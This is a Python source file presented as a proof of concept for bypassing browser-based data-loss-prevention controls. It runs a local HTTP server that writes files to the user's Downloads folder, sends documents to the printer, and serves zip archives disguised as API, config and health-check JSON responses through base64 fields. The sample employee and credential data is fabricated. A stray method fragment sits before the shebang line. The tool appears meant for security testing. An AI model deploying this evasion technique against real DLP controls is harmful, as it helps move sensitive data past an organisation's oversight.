def send_error_response(self, message):
        """Send error JSON response"""
        self.send_response(500)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        error_data = {"status": "error", "message": message}
        self.wfile.write(json.dumps(error_data).encode())#!/usr/bin/env python3
"""
DLP Bypass Proof of Concept - Local HTTP Server
Demonstrates how local applications can circumvent browser-based security controls

REQUIREMENTS:
- Python 3.6+ (no additional packages required - uses only standard library)

INSTALLATION:
No additional packages needed! This script uses only Python standard library modules:
- http.server (built-in)
- json (built-in) 
- os (built-in)
- tempfile (built-in)
- zipfile (built-in)
- datetime (built-in)
- urllib.parse (built-in)
- subprocess (built-in)
- sys (built-in)
- platform (built-in)

USAGE:
1. Save this file as: dlp_bypass_server.py
2. Run: python dlp_bypass_server.py
3. Open the HTML file in your browser
4. Click buttons to test bypasses

The server will run on http://127.0.0.1:19847
"""

import json
import os
import tempfile
import zipfile
import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import subprocess
import sys
import platform

class DLPBypassHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')  # In real Box, this would be specific domains
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_GET(self):
        """Handle GET requests for file downloads"""
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/status':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            response = {"status": "active", "message": "DLP Bypass Server is running"}
            self.wfile.write(json.dumps(response).encode())
            
        elif parsed_path.path == '/download_file':
            # Create a sample file to download
            self.create_and_serve_file()
            
        elif parsed_path.path == '/api/document':
            # Alternative endpoint that looks like a document API
            self.serve_disguised_download()
            
        elif parsed_path.path == '/config.json':
            # Disguised as a config file
            self.serve_config_disguised_download()
            
        elif parsed_path.path == '/health':
            # Health check endpoint that serves file
            self.serve_health_disguised_download()
            
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        """Handle POST requests for commands"""
        if self.path.startswith('/execute_command'):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                command_data = json.loads(post_data.decode('utf-8'))
                self.process_command(command_data)
            except json.JSONDecodeError:
                self.send_error_response("Invalid JSON")
                return
                
        else:
            self.send_response(404)
            self.end_headers()

    def create_and_serve_file(self):
        """Create and serve a sample file for download"""
        try:
            # Create a temporary zip file with sensitive-looking content
            temp_dir = tempfile.mkdtemp()
            zip_path = os.path.join(temp_dir, "sensitive_data.zip")
            
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                # Add some "sensitive" files
                zipf.writestr("employee_data.txt", 
                    "Employee ID,Name,SSN,Salary\n"
                    "001,John Doe,123-45-6789,$75000\n"
                    "002,Jane Smith,987-65-4321,$82000\n"
                    "003,Bob Johnson,555-12-3456,$68000")
                
                zipf.writestr("financial_report.txt",
                    "Q4 Financial Report - CONFIDENTIAL\n"
                    "Revenue: $2.5M\n"
                    "Profit: $450K\n"
                    "Projected Growth: 15%")
                
                zipf.writestr("passwords.txt",
                    "System Passwords - TOP SECRET\n"
                    "Database: admin123\n"
                    "Email Server: secure456\n"
                    "Backup System: backup789")

            # Serve the file
            with open(zip_path, 'rb') as f:
                file_content = f.read()

            self.send_response(200)
            self.send_header('Content-Type', 'application/zip')
            self.send_header('Content-Disposition', 'attachment; filename="sensitive_data.zip"')
            self.send_header('Content-Length', str(len(file_content)))
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(file_content)
            
            # Clean up
            os.unlink(zip_path)
            os.rmdir(temp_dir)
            
            print(f"[SECURITY BYPASS] File downloaded: sensitive_data.zip")
            
        except Exception as e:
            self.send_error_response(f"Error creating file: {str(e)}")

    def process_command(self, command_data):
        """Process commands from the web interface"""
        command_type = command_data.get('command_type')
        
        if command_type == 'print_document':
            self.handle_print_command(command_data)
        elif command_type == 'download_file':
            self.handle_download_command(command_data)
        else:
            self.send_error_response("Unknown command type")

    def handle_print_command(self, command_data):
        """Handle print command - creates file and sends to printer"""
        try:
            # Create a document with the provided content
            content = command_data.get('content', 'Default poem content')
            
            # Create temporary file (but don't auto-delete it immediately on Windows)
            temp_dir = tempfile.mkdtemp()
            doc_path = os.path.join(temp_dir, "document_to_print.txt")
            
            print(f"[DEBUG] Creating document at: {doc_path}")
            
            with open(doc_path, 'w') as f:
                f.write("=== DOCUMENT BYPASSED DLP CONTROLS ===\n\n")
                f.write(content)
                f.write("\n\n=== PRINTED VIA LOCAL APPLICATION ===")
                f.write(f"\nGenerated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Send to printer (on Windows, this now opens Notepad for manual printing)
            success = self.send_to_printer(doc_path)
            
            if success:
                if platform.system() == "Windows":
                    response = {"status": "success", "message": f"Document opened in Notepad for printing. File: {doc_path}"}
                    print(f"[SECURITY BYPASS] Document opened for printing: {content[:50]}...")
                    # Don't clean up the file immediately on Windows so Notepad can access it
                else:
                    response = {"status": "success", "message": "Document sent to printer"}
                    print(f"[SECURITY BYPASS] Document printed: {content[:50]}...")
                    # Clean up on other platforms
                    os.unlink(doc_path)
                    os.rmdir(temp_dir)
            else:
                response = {"status": "warning", "message": "Print command executed (printer may not be available)"}
                # Clean up on failure
                os.unlink(doc_path)
                os.rmdir(temp_dir)
            
            self.send_success_response(response)
            
        except Exception as e:
            print(f"[DEBUG] Print exception: {str(e)}")
            self.send_error_response(f"Print error: {str(e)}")

    def handle_download_command(self, command_data):
        """Handle download command"""
        try:
            # Simulate downloading a file to local system
            filename = command_data.get('filename', 'downloaded_file.txt')
            content = command_data.get('content', 'This file was downloaded bypassing DLP controls')
            
            # Save to Downloads folder or current directory
            downloads_path = self.get_downloads_folder()
            file_path = os.path.join(downloads_path, filename)
            
            # Debug output
            print(f"[DEBUG] Attempting to save file to: {file_path}")
            print(f"[DEBUG] Downloads path: {downloads_path}")
            print(f"[DEBUG] Current working directory: {os.getcwd()}")
            
            with open(file_path, 'w') as f:
                f.write("=== FILE BYPASSED DLP CONTROLS ===\n\n")
                f.write(content)
                f.write("\n\n=== SAVED VIA LOCAL APPLICATION ===")
            
            # Verify file was actually created
            if os.path.exists(file_path):
                file_size = os.path.getsize(file_path)
                print(f"[DEBUG] File successfully created: {file_path} ({file_size} bytes)")
                response = {"status": "success", "message": f"File saved to {file_path}"}
            else:
                print(f"[DEBUG] ERROR: File was not created at {file_path}")
                response = {"status": "error", "message": f"Failed to create file at {file_path}"}
            
            print(f"[SECURITY BYPASS] File saved: {file_path}")
            
            self.send_success_response(response)
            
        except Exception as e:
            print(f"[DEBUG] Exception occurred: {str(e)}")
            self.send_error_response(f"Download error: {str(e)}")

    def send_to_printer(self, file_path):
        """Send file to default printer (platform-specific)"""
        try:
            system = platform.system()
            
            if system == "Windows":
                # Windows: Open in notepad first, let user decide when to print/close
                print(f"[DEBUG] Opening file in Notepad: {file_path}")
                # Use regular notepad (not /p flag) so it stays open
                subprocess.Popen(["notepad", file_path])
                print(f"[DEBUG] Notepad opened with file. User can manually print via File > Print")
                return True
            elif system == "Darwin":  # macOS
                # macOS: use lp command
                subprocess.run(["lp", file_path], check=True)
            elif system == "Linux":
                # Linux: use lp command
                subprocess.run(["lp", file_path], check=True)
            else:
                print(f"Unsupported platform for printing: {system}")
                return False
                
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"Error sending to printer: {e}")
            return False
        except FileNotFoundError:
            print("Print command not found - printer may not be configured")
            return False

    def get_downloads_folder(self):
        """Get the user's Downloads folder"""
        home = os.path.expanduser("~")
        downloads = os.path.join(home, "Downloads")
        
        if os.path.exists(downloads):
            return downloads
        else:
            return os.getcwd()  # Fallback to current directory

    def send_success_response(self, data):
        """Send successful JSON response"""
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def serve_disguised_download(self):
        """Serve file disguised as API response"""
        try:
            # Create file content as base64 embedded in JSON
            file_content = self.create_sensitive_content()
            import base64
            encoded_content = base64.b64encode(file_content).decode('utf-8')
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            # Disguise as API response
            response = {
                "status": "success",
                "document_id": "12345",
                "metadata": {
                    "title": "Annual Report",
                    "created": "2024-01-15"
                },
                "content": encoded_content,
                "filename": "annual_report.zip"
            }
            self.wfile.write(json.dumps(response).encode())
            print(f"[SECURITY BYPASS] File served via disguised API endpoint")
            
        except Exception as e:
            self.send_error_response(f"Error serving disguised file: {str(e)}")

    def serve_config_disguised_download(self):
        """Serve file disguised as configuration"""
        try:
            file_content = self.create_sensitive_content()
            import base64
            encoded_content = base64.b64encode(file_content).decode('utf-8')
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            # Disguise as config file
            response = {
                "app_version": "1.2.3",
                "environment": "production",
                "features": {
                    "download_enabled": True,
                    "print_enabled": True
                },
                "backup_data": encoded_content,  # Hidden here
                "backup_filename": "backup.zip"
            }
            self.wfile.write(json.dumps(response).encode())
            print(f"[SECURITY BYPASS] File served via config endpoint")
            
        except Exception as e:
            self.send_error_response(f"Error serving config disguised file: {str(e)}")

    def serve_health_disguised_download(self):
        """Serve file disguised as health check with diagnostic data"""
        try:
            file_content = self.create_sensitive_content()
            import base64
            encoded_content = base64.b64encode(file_content).decode('utf-8')
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            # Disguise as health check
            response = {
                "status": "healthy",
                "uptime": "24h 30m",
                "memory_usage": "45%",
                "cpu_usage": "12%",
                "diagnostic_logs": encoded_content,  # Hidden here
                "log_filename": "diagnostics.zip"
            }
            self.wfile.write(json.dumps(response).encode())
            print(f"[SECURITY BYPASS] File served via health check endpoint")
            
        except Exception as e:
            self.send_error_response(f"Error serving health disguised file: {str(e)}")

    def create_sensitive_content(self):
        """Create the sensitive file content as bytes"""
        import io
        
        # Create zip in memory
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zipf:
            zipf.writestr("employee_data.txt", 
                "Employee ID,Name,SSN,Salary\n"
                "001,John Doe,123-45-6789,$75000\n"
                "002,Jane Smith,987-65-4321,$82000\n"
                "003,Bob Johnson,555-12-3456,$68000")
            
            zipf.writestr("financial_report.txt",
                "Q4 Financial Report - CONFIDENTIAL\n"
                "Revenue: $2.5M\n"
                "Profit: $450K\n"
                "Projected Growth: 15%")
            
            zipf.writestr("access_credentials.txt",
                "System Access Credentials - TOP SECRET\n"
                "Database: admin/SecurePass123!\n"
                "Email Server: mailuser/Email456@\n"
                "Backup System: backup/BackupKey789#")
        
        return zip_buffer.getvalue()

def main():
    port = 19847  # Random high port to avoid conflicts
    
    print("=" * 60)
    print("DLP BYPASS PROOF OF CONCEPT")
    print("=" * 60)
    print(f"Starting local server on http://127.0.0.1:{port}")
    print("This demonstrates how local applications can bypass browser security")
    print("=" * 60)
    
    try:
        server = HTTPServer(('127.0.0.1', port), DLPBypassHandler)
        print(f"Server running on port {port}")
        print("Open the HTML file in your browser to test the bypass")
        print("Press Ctrl+C to stop the server")
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
    except OSError as e:
        if e.errno == 48:  # Port already in use
            print(f"Port {port} is already in use. Try stopping other applications or use a different port.")
        else:
            print(f"Error starting server: {e}")

if __name__ == "__main__":
    main()
